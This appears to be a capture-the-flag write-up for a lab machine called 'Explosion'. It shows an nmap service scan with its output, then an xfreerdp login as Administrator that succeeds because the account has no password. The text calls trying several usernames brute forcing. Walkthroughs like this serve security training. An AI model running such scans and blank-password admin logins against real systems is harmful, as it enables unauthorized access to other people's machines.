# Explosion

- TL;DR: We are able to connect to a Windows host without a passwrod using `xfreerdp` and the `Administrator` username.

## Reconnaissance 

- Run an nmap scan:
```
nmap -sV -oA nmap_scans/Explosion 10.129.1.13

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 07:03 PDT
Nmap scan report for 10.129.1.13
Host is up (0.077s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.19 seconds

```

<br>

## Exploitation

- We find the following port(s) open:
    - `135/tcp` msrpc
    - `139/tcp` netbios-ssn
    - `445/tcp` microsoft-ds
    - `3389/tcp` ms-wbt-server
- Next we install the `xfreerdp` tool if its not already installed by running `sudo apt-get install freerdp2-x11`
- Once installed, we try to connect to the host with our current username `xfreerdp /v:10.129.1.13`. We are unable to connect to the host because to does not accpet our current username for the RDP session login.
- We try and brute force multiple usernames and get a hit on `Administrator` by running `xfreerdp /v:10.129.1.13 /cert:ignore /u:Administrator`
- During the initialization of the RDP session, we are asked for a `Password`. However, the `Administrator` account has not been configured with a password for logging in, This allows us to log in without a password.

